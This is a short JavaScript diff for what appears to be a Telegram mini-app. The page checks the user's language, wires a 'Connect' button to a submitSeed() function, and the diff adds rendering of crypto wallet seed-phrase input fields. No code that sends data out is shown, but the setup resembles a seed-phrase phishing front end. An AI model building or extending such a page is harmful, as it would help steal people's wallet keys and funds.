@@ -24,7 +24,8 @@ if (!langs.some(lang => allowedLangs.includes(lang))) {
 }
 
 // ✅ DOM
-document.addEventListener("DOMContentLoaded", () => {
+// ✅ DOM готовий
+document.addEventListener("DOMContentLoaded", async () => {
     console.log("📦 DOMContentLoaded подія спрацювала");
 
     // Перевірка Telegram WebApp
@@ -42,7 +43,7 @@ document.addEventListener("DOMContentLoaded", () => {
         btn.addEventListener("click", () => {
             console.log("🔘 Кнопка 'Подключить' нажата");
             try {
-                submitSeed();  // ← виклик твоєї функції
+                submitSeed();
             } catch (e) {
                 console.error("❌ Помилка у submitSeed:", e);
             }
@@ -50,6 +51,9 @@ document.addEventListener("DOMContentLoaded", () => {
     } else {
         console.warn("🚫 Кнопка #submitBtn не знайдена у DOM");
     }
+
+    // Встановлюємо дефолтне поле
+    renderSeedInputs();
 });
 
 // 📦 Поля seed-фрази
